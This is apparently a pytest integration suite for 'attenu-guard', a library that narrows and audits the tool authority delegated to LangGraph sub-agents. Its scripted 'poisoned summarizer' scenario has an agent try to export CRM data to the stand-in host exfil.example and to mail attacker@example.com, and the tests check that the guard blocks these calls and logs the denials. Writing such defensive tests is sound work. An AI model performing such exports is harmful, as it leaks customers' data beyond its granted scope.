"""attenu-guard × LangGraph 1.x — integration tests.

Runs the canonical "poisoned summarizer" scenario against a REAL, compiled
LangGraph graph, driven by a scripted offline chat model (no LLM API key, no
network). Three call paths are covered, because LangGraph 1.x has three:

  1. hand-written graph nodes      -> the SHIPPED adapter
                                      (`attenu_guard.adapters.langgraph`)
  2. `ToolNode(wrap_tool_call=…)`  -> the example adapter's tool gate, on a
                                      hand-rolled `StateGraph`
  3. `create_agent(middleware=…)`  -> the same gate, as LangChain middleware

Skips cleanly when langgraph isn't installed.
"""
from __future__ import annotations

import importlib.util
import sys
from pathlib import Path
from typing import Annotated, Any, TypedDict

import pytest

pytest.importorskip("langgraph")
pytest.importorskip("langchain_core")

from langchain_core.language_models.chat_models import BaseChatModel  # noqa: E402
from langchain_core.messages import AIMessage, AnyMessage, ToolMessage  # noqa: E402
from langchain_core.outputs import ChatGeneration, ChatResult  # noqa: E402
from langchain_core.tools import tool  # noqa: E402
from langgraph.graph import END, START, StateGraph  # noqa: E402
from langgraph.graph.message import add_messages  # noqa: E402
from langgraph.prebuilt import ToolNode, tools_condition  # noqa: E402

from attenu_guard import (  # noqa: E402
    AuditLog,
    Authority,
    AuthorityDenied,
    EgressRank,
    Guard,
    RowLimit,
)
from attenu_guard.reasons import BodyState, Capture  # noqa: E402

# --------------------------------------------------------------------------
# Load the example adapter by path. It deliberately lives under examples/ (it
# is a paste-me-into-your-project reference, not shipped library code), and
# its directory is named `langgraph`, so we must NOT put that directory on
# sys.path — that would shadow nothing today but is a trap waiting to happen.
# --------------------------------------------------------------------------
import attenu_guard.adapters.langchain as dg_langgraph
GuardedDelegation = dg_langgraph.GuardedDelegation
ToolPolicy = dg_langgraph.ToolPolicy


# --------------------------------------------------------------------------
# Offline model: scripted AIMessages with tool_calls. `bind_tools` is a no-op
# passthrough because the script already decides which tools get called.
# --------------------------------------------------------------------------
class ScriptedToolModel(BaseChatModel):
    """Replays a fixed list of AIMessages. No API key, no network."""

    responses: list
    i: int = 0

    def _generate(self, messages, stop=None, run_manager=None, **kwargs) -> ChatResult:
        message = self.responses[min(self.i, len(self.responses) - 1)]
        self.i += 1
        return ChatResult(generations=[ChatGeneration(message=message)])

    def bind_tools(self, tools, **kwargs):  # noqa: ANN001
        return self

    @property
    def _llm_type(self) -> str:
        return "scripted-tool-model"


def _call(name: str, args: dict, call_id: str) -> AIMessage:
    return AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": call_id}])


# --------------------------------------------------------------------------
# The scenario's tools. Each records a side effect so a test can assert the
# BODY never ran, not merely that some error came back.
# --------------------------------------------------------------------------
@pytest.fixture
def side_effects() -> list:
    return []


def _make_tools(side_effects: list):
    @tool
    def crm_query(rows: int) -> str:
        """Read `rows` rows from the CRM."""
        side_effects.append(("crm_query", rows))
        return f"{rows} CRM rows"

    @tool
    def crm_export(destination: str) -> str:
        """Export the CRM to an external destination."""
        side_effects.append(("crm_export", destination))
        return f"exported to {destination}"

    @tool
    def send_mail(to: str) -> str:
        """Send mail."""
        side_effects.append(("send_mail", to))
        return f"mailed {to}"

    return crm_query, crm_export, send_mail


POLICIES = {
    "crm_query": ToolPolicy("crm.read", lambda args: {"rows": args.get("rows", 0)}),
    "crm_export": ToolPolicy("crm.export", lambda args: {"egress": "any"}),
    "send_mail": ToolPolicy("mail.send", lambda args: {"egress": "any"}),
}

ORCHESTRATOR_AUTHORITY = Authority(
    scopes={"crm.*", "mail.send"},
    ceilings=[RowLimit(100_000), EgressRank("any")],
    ttl=3600,
)
SUMMARIZER_AUTHORITY = Authority(
    scopes={"crm.read"},
    ceilings=[RowLimit(5_000), EgressRank("none")],
    ttl=900,
)


def _fresh_chain():
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root")
    summarizer = root.delegate("summarizer", SUMMARIZER_AUTHORITY, task="summarize Q3 pipeline")
    return root, summarizer


# ==========================================================================
# 1. The SHIPPED adapter, on a real StateGraph (previously only ever tested
#    against a fake graph object).
# ==========================================================================
def test_shipped_adapter_guards_a_real_compiled_stategraph(side_effects):
    from attenu_guard.adapters.langgraph import add_guarded_node, guard_node

    root, summarizer = _fresh_chain()

    class S(TypedDict):
        messages: Annotated[list[AnyMessage], add_messages]
        expected_rows: int
        note: str

    @guard_node(summarizer, "crm.read", context_fn=lambda state: {"rows": state["expected_rows"]})
    def summarize(state: S) -> dict:
        side_effects.append(("summarize_node", state["expected_rows"]))
        return {"note": "summarised"}

    def export_impl(state: S) -> dict:
        side_effects.append(("export_node", "https://exfil.example"))
        return {"note": "exported"}

    graph = StateGraph(S)
    graph.add_node("summarize", summarize)
    add_guarded_node(
        graph, "export", summarizer, "crm.export", export_impl,
        context_fn=lambda state: {"egress": "any"},
    )
    graph.add_edge(START, "summarize")
    graph.add_edge("summarize", "export")
    graph.add_edge("export", END)
    app = graph.compile()

    with pytest.raises(AuthorityDenied):
        app.invoke({"messages": [], "expected_rows": 4200, "note": ""})

    assert ("summarize_node", 4200) in side_effects
    assert not any(e[0] == "export_node" for e in side_effects)


# ==========================================================================
# 2. Raw StateGraph + ToolNode(wrap_tool_call=…) — the LangGraph-native tool
#    interception point.
# ==========================================================================
def _build_tool_graph(model, guarded, tools):
    class S(TypedDict):
        messages: Annotated[list[AnyMessage], add_messages]

    def call_model(state: S) -> dict:
        return {"messages": [model.invoke(state["messages"])]}

    graph = StateGraph(S)
    graph.add_node("model", call_model)
    graph.add_node("tools", ToolNode(list(tools), wrap_tool_call=guarded.wrap_tool_call))
    graph.add_edge(START, "model")
    graph.add_conditional_edges("model", tools_condition, {"tools": "tools", END: END})
    graph.add_edge("tools", "model")
    return graph.compile()


def test_toolnode_blocks_export_before_the_tool_body_runs(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 4200}, "c1"),
        _call("crm_export", {"destination": "https://exfil.example"}, "c2"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    out = app.invoke({"messages": [("user", "summarize Q3 pipeline")]})

    # (a) the in-authority call ran
    assert ("crm_query", 4200) in side_effects
    # (b) the poisoned call NEVER reached the tool body
    assert not any(e[0] == "crm_export" for e in side_effects)

    denials = [m for m in out["messages"]
               if isinstance(m, ToolMessage) and m.status == "error"]
    assert len(denials) == 1
    assert "scope_not_granted" in denials[0].content


def test_row_ceiling_denies_an_oversized_read(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 90_000}, "c1"),   # under root's 100k, over the child's 5k
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    out = app.invoke({"messages": [("user", "dump everything")]})

    assert side_effects == []
    denial = next(m for m in out["messages"]
                  if isinstance(m, ToolMessage) and m.status == "error")
    assert "ceiling_exceeded" in denial.content


def test_unlisted_tool_fails_closed(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    # send_mail deliberately absent from the policy map
    guarded = GuardedDelegation(summarizer, tools={
        "crm_query": POLICIES["crm_query"], "crm_export": POLICIES["crm_export"],
    })

    model = ScriptedToolModel(responses=[
        _call("send_mail", {"to": "attacker@example.com"}, "c1"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    out = app.invoke({"messages": [("user", "mail it out")]})

    assert side_effects == []
    denial = next(m for m in out["messages"]
                  if isinstance(m, ToolMessage) and m.status == "error")
    assert "no attenu-guard policy" in denial.content


def test_denials_carry_disposition_on_the_ledger_held_vs_unresolved(side_effects):
    """Slice 1 / Plan A: a held tool says held_pending_grant; an unlisted tool lands on the ledger as unresolved."""
    from attenu_guard import Disposition
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools={
        "crm_query": POLICIES["crm_query"],
        "crm_export": ToolPolicy("crm.export", lambda args: {"egress": "any"}, disposition=Disposition.HELD_PENDING_GRANT),
        # send_mail deliberately absent
    })
    model = ScriptedToolModel(responses=[
        _call("crm_export", {"destination": "x"}, "c1"),
        _call("send_mail", {"to": "attacker@example.com"}, "c2"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})
    assert side_effects == []
    led = {e["tool"]: e for e in root.audit_log().entries if e["event"] == "deny"}
    assert led["crm_export"]["disposition"] == "held_pending_grant"
    assert led["send_mail"]["disposition"] == "unresolved" and led["send_mail"]["reason"] == "no_authority"


def test_deny_mode_raise_aborts_the_graph(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES, on_deny="raise")

    model = ScriptedToolModel(responses=[
        _call("crm_export", {"destination": "https://exfil.example"}, "c1"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])

    with pytest.raises(AuthorityDenied):
        app.invoke({"messages": [("user", "exfiltrate")]})
    assert side_effects == []


def test_revocation_cascades_to_a_running_graph(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    def run():
        model = ScriptedToolModel(responses=[
            _call("crm_query", {"rows": 100}, "c1"),
            AIMessage(content="done"),
        ])
        app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
        return app.invoke({"messages": [("user", "read a little")]})

    run()
    assert ("crm_query", 100) in side_effects

    root.revoke(summarizer.node_id)          # cascade from the parent
    side_effects.clear()
    out = run()

    assert side_effects == []
    denial = next(m for m in out["messages"]
                  if isinstance(m, ToolMessage) and m.status == "error")
    assert "revoked" in denial.content


# ==========================================================================
# 3. LangChain `create_agent` + middleware — the officially blessed hook in
#    the LangChain 1.x / LangGraph 1.x agent stack.
# ==========================================================================
def test_create_agent_middleware_blocks_export_before_the_body(side_effects):
    pytest.importorskip("langchain")
    from langchain.agents import create_agent

    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 4200}, "c1"),
        _call("crm_export", {"destination": "https://exfil.example"}, "c2"),
        AIMessage(content="done"),
    ])
    agent = create_agent(
        model,
        tools=[crm_query, crm_export, send_mail],
        middleware=[guarded.middleware()],
    )
    out = agent.invoke({"messages": [("user", "summarize Q3 pipeline")]})

    assert ("crm_query", 4200) in side_effects
    assert not any(e[0] == "crm_export" for e in side_effects)
    assert any(isinstance(m, ToolMessage) and m.status == "error" for m in out["messages"])


# ==========================================================================
# 4. Structural guarantees + audit trail.
# ==========================================================================
def test_child_is_provably_narrower_and_cannot_be_widened():
    root, summarizer = _fresh_chain()
    assert summarizer.authority.is_narrower_than(root.authority)
    assert not root.authority.is_narrower_than(summarizer.authority)

    greedy = summarizer.delegate(
        "greedy",
        Authority(scopes={"crm.*", "mail.send", "admin.*"},
                  ceilings=[RowLimit(10_000_000), EgressRank("any")], ttl=99_999),
        task="please give me everything",
    )
    # The request asked for MORE than the parent holds; it was met down.
    assert greedy.authority.is_narrower_than(summarizer.authority)
    assert greedy.authority.scopes == frozenset({"crm.read"})
    assert greedy.authority.ceiling("max_rows").max_rows == 5_000
    assert greedy.authority.ceiling("egress").level == "none"
    assert greedy.authority.ttl == 900
    assert not greedy.check("mail.send")
    assert not greedy.check("admin.reset")


def test_audit_log_verifies_and_records_the_denial(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 4200}, "c1"),
        _call("crm_export", {"destination": "https://exfil.example"}, "c2"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "summarize Q3 pipeline")]})

    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok, err

    denies = [e for e in entries if e["event"] == "deny"]
    assert len(denies) == 1
    assert denies[0]["tool"] == "crm_export"
    assert denies[0]["scope"] == "crm.export"
    assert denies[0]["reason"] == "scope_not_granted"
    assert denies[0]["node"] == summarizer.node_id

    allows = [e for e in entries if e["event"] == "allow"]
    assert [a["tool"] for a in allows] == ["crm_query"]
    assert any(e["event"] == "spawn" for e in entries)


# ==========================================================================
# 5. The async path (`ainvoke`) — same gate via `awrap_tool_call`.
#    Uses asyncio.run() rather than pytest-asyncio so the suite needs no
#    extra plugin.
# ==========================================================================
def test_async_toolnode_blocks_export_before_the_tool_body(side_effects):
    import asyncio

    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    class S(TypedDict):
        messages: Annotated[list[AnyMessage], add_messages]

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 4200}, "c1"),
        _call("crm_export", {"destination": "https://exfil.example"}, "c2"),
        AIMessage(content="done"),
    ])

    async def call_model(state: S) -> dict:
        return {"messages": [await model.ainvoke(state["messages"])]}

    graph = StateGraph(S)
    graph.add_node("model", call_model)
    graph.add_node("tools", ToolNode(
        [crm_query, crm_export, send_mail],
        wrap_tool_call=guarded.wrap_tool_call,
        awrap_tool_call=guarded.awrap_tool_call,
    ))
    graph.add_edge(START, "model")
    graph.add_conditional_edges("model", tools_condition, {"tools": "tools", END: END})
    graph.add_edge("tools", "model")
    app = graph.compile()

    out = asyncio.run(app.ainvoke({"messages": [("user", "summarize Q3 pipeline")]}))

    assert ("crm_query", 4200) in side_effects
    assert not any(e[0] == "crm_export" for e in side_effects)
    denial = next(m for m in out["messages"]
                  if isinstance(m, ToolMessage) and m.status == "error")
    assert "scope_not_granted" in denial.content


# ==========================================================================
# 5. Observe mode for SAMPLING (attenu-derive P1): unlisted tools and undeclared
#    sub-agents get a GENERATED policy/authority so every call is authorized-and-
#    RECORDED through the guard instead of denied (fail-closed default) or silently
#    passed through (`allow_unlisted=True`). Deny stays the default when neither
#    hook is given.
# ==========================================================================
def test_default_policy_records_unlisted_tools_instead_of_denying(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root = Guard.issue("recorder", Authority({"observe.*"}, [], ttl=None), task="sample")
    seen = []
    def observe(name):
        seen.append(name)
        return ToolPolicy(f"observe.{name}", lambda args: {"arg_keys": sorted(args)})
    guarded = GuardedDelegation(root, tools={}, default_policy=observe)

    model = ScriptedToolModel(responses=[
        _call("send_mail", {"to": "x@example.com"}, "c1"),
        _call("crm_query", {"rows": 7}, "c2"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})

    assert side_effects == [("send_mail", "x@example.com"), ("crm_query", 7)]   # ran (allowed)
    assert seen == ["send_mail", "crm_query"]                                    # generated per tool
    allows = [e for e in root.audit_log() if e["event"] == "allow"]
    assert [(e["tool"], e["scope"], e["context"]) for e in allows] == [
        ("send_mail", "observe.send_mail", {"arg_keys": ["to"]}),
        ("crm_query", "observe.crm_query", {"arg_keys": ["rows"]}),
    ]                                                                            # RECORDED, with the policy's context
    ok, _ = AuditLog.verify(root.audit_log().entries)
    assert ok


def test_default_subagent_authority_mints_children_for_undeclared_subagents(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root = Guard.issue("recorder", Authority({"observe.*"}, [], ttl=None), task="sample")
    guarded = GuardedDelegation(
        root, tools={}, subagents={},
        default_policy=lambda name: ToolPolicy(f"observe.{name}"),
        default_subagent_authority=lambda name: Authority({"observe.*"}, [], ttl=None),
    )
    # A `task` call for a sub-agent nobody declared: observe mode delegates anyway.
    from types import SimpleNamespace
    req = SimpleNamespace(tool_call={"name": "task", "args": {"subagent_type": "researcher",
                                                                "description": "look things up"}})
    gate = guarded._gate(req, capture=dg_langgraph.Capture.WRAPPER_SYNC)
    assert gate.denial is None and gate.child is not None
    assert gate.child.agent_id == "researcher" and gate.child.is_narrower_than(root)
    spawn = [e for e in root.audit_log() if e["event"] == "spawn"][-1]
    assert spawn["agent"] == "researcher" and spawn["task"] == "look things up"


def test_without_the_hooks_unlisted_still_fails_closed(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()
    guarded = GuardedDelegation(summarizer, tools={})
    model = ScriptedToolModel(responses=[_call("send_mail", {"to": "a@b"}, "c1"), AIMessage(content="x")])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})
    assert side_effects == []


def test_delegation_lifecycle_end_is_recorded_when_the_task_tool_returns(side_effects):
    """`done` on the ledger when the delegation tool's handler returns (per-node truncation accounting downstream)."""
    root = Guard.issue("recorder", Authority({"observe.*"}, [], ttl=None), task="sample")
    guarded = GuardedDelegation(root, tools={}, subagents={},
                                default_policy=lambda name: ToolPolicy(f"observe.{name}"),
                                default_subagent_authority=lambda name: Authority({"observe.*"}, [], ttl=None))
    from types import SimpleNamespace
    req = SimpleNamespace(tool_call={"name": "task", "args": {"subagent_type": "researcher", "description": "look things up"}})
    out = guarded.wrap_tool_call(req, lambda r: "child ran")
    assert out == "child ran"
    child = guarded.children["researcher"]
    assert child.is_complete
    dones = [e for e in root.audit_log() if e["event"] == "done"]
    assert len(dones) == 1 and dones[0]["agent"] == "researcher" and dones[0]["node"] == child.node_id


# ==========================================================================
# Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
# GuardedDelegation calls the tool body itself (handler(request)), exactly
# like adapters/langgraph.py's reference wiring, so WRAPPER_SYNC/WRAPPER_ASYNC
# is a genuine observation -- no cross-hook honesty caveat is needed.
# ==========================================================================
def _fresh_chain_v2():
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)
    summarizer = root.delegate("summarizer", SUMMARIZER_AUTHORITY, task="summarize Q3 pipeline")
    return root, summarizer


def test_v2_allowed_call_records_a_returned_outcome(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain_v2()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 10}, "c1"),
        AIMessage(content="done"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})

    entries = list(root.audit_log())
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_SYNC
    assert allow["adapter"]["module"] == "attenu_guard.adapters.langchain"
    assert outcome["body_state"] == BodyState.RETURNED
    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0


def test_v2_async_allowed_call_records_a_returned_outcome_wrapper_async(side_effects):
    import asyncio

    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain_v2()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    class S(TypedDict):
        messages: Annotated[list[AnyMessage], add_messages]

    model = ScriptedToolModel(responses=[
        _call("crm_query", {"rows": 10}, "c1"),
        AIMessage(content="done"),
    ])

    async def call_model(state: S) -> dict:
        return {"messages": [await model.ainvoke(state["messages"])]}

    graph = StateGraph(S)
    graph.add_node("model", call_model)
    graph.add_node("tools", ToolNode(
        [crm_query, crm_export, send_mail],
        wrap_tool_call=guarded.wrap_tool_call,
        awrap_tool_call=guarded.awrap_tool_call,
    ))
    graph.add_edge(START, "model")
    graph.add_conditional_edges("model", tools_condition, {"tools": "tools", END: END})
    graph.add_edge("tools", "model")
    app = graph.compile()

    asyncio.run(app.ainvoke({"messages": [("user", "go")]}))

    entries = list(root.audit_log())
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_ASYNC
    assert outcome["body_state"] == BodyState.RETURNED


def test_v2_a_tool_that_raises_records_a_raised_outcome(side_effects):
    root, summarizer = _fresh_chain_v2()

    @tool
    def crm_query(rows: int) -> str:
        """Raises instead of returning."""
        raise ValueError("boom")

    guarded = GuardedDelegation(summarizer, tools=POLICIES)
    model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
    app = _build_tool_graph(model, guarded, [crm_query])
    with pytest.raises(ValueError):
        app.invoke({"messages": [("user", "go")]})

    entries = list(root.audit_log())
    outcome = next(e for e in entries if e["event"] == "outcome")
    assert outcome["body_state"] == BodyState.RAISED
    assert outcome["error_code"] == "ValueError"


def test_v2_denied_call_never_records_an_outcome(side_effects):
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain_v2()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)
    model = ScriptedToolModel(responses=[
        _call("crm_export", {"destination": "https://exfil.example"}, "c1"),
        AIMessage(content="x"),
    ])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})

    assert side_effects == []
    entries = list(root.audit_log())
    assert [e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_export"] == []
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v1_chain_gets_no_capture_adapter_or_outcome(side_effects):
    """schema_version=1 (the default): byte-and-type identical to every release before 0.9.0."""
    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain()   # v1, unchanged default
    guarded = GuardedDelegation(summarizer, tools=POLICIES)
    model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})

    entries = list(root.audit_log())
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert "capture" not in allow and "adapter" not in allow and "call_id" not in allow
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v2_delegation_call_never_gets_capture_or_an_outcome(side_effects):
    """The `task` tool mints via guard.delegate(), never calls guard.check() -- there is no
    Decision/call_id for it to bind an outcome to, on any schema version."""
    root = Guard.issue("recorder", Authority({"observe.*"}, [], ttl=None), task="sample", schema_version=2)
    guarded = GuardedDelegation(root, tools={}, subagents={},
                                default_policy=lambda name: ToolPolicy(f"observe.{name}"),
                                default_subagent_authority=lambda name: Authority({"observe.*"}, [], ttl=None))
    from types import SimpleNamespace
    req = SimpleNamespace(tool_call={"name": "task", "args": {"subagent_type": "researcher", "description": "x"}})
    out = guarded.wrap_tool_call(req, lambda r: "child ran")
    assert out == "child ran"
    entries = list(root.audit_log())
    assert [e for e in entries if e["event"] in ("allow", "outcome")] == []


def test_v2_async_cancelled_call_records_abandoned_and_still_propagates(side_effects):
    import asyncio

    crm_query, crm_export, send_mail = _make_tools(side_effects)
    root, summarizer = _fresh_chain_v2()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)

    async def hangs(request):
        await asyncio.sleep(3600)

    from types import SimpleNamespace
    req = SimpleNamespace(tool_call={"name": "crm_query", "args": {"rows": 10}, "id": "c1"})

    async def scenario():
        task = asyncio.ensure_future(guarded.awrap_tool_call(req, hangs))
        await asyncio.sleep(0)   # let it reach the awaited sleep
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task

    asyncio.run(scenario())
    entries = list(root.audit_log())
    outcome = next(e for e in entries if e["event"] == "outcome")
    assert outcome["body_state"] == BodyState.ABANDONED
    assert "error_code" not in outcome


def test_snapshot_freeze_never_aliases_a_custom_deepcopy_that_returns_itself():
    """Codex review (all six earlier adapters, round 2, finding 4): _freeze() must never call
    ANY copy protocol (copy.deepcopy included) on a container -- a class free to implement
    __deepcopy__ to return `self` would otherwise make a "snapshot" alias the live object."""
    class AliasingList(list):
        def __deepcopy__(self, memo):
            return self

    live = {"x": AliasingList([1])}
    snapshot = dg_langgraph._snapshot_params(live)

    assert snapshot["x"] is not live["x"], "the snapshot aliased the live mutable container"
    live["x"].append(2)
    assert snapshot["x"] == [1], "mutating the live container changed the snapshot"


def test_v2_complete_finalizes_and_verifier_reports_the_tool_call_observed():
    """After a real graph run, the summarizer's own Guard must be able to complete() -- proving
    every allowed, v2, WRAPPER-captured call genuinely got its outcome bound, not merely that
    the graph didn't crash."""
    crm_query, crm_export, send_mail = _make_tools([])
    root, summarizer = _fresh_chain_v2()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)
    model = ScriptedToolModel(responses=[_call("crm_query", {"rows": 10}, "c1"), AIMessage(content="x")])
    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
    app.invoke({"messages": [("user", "go")]})

    assert summarizer.complete()
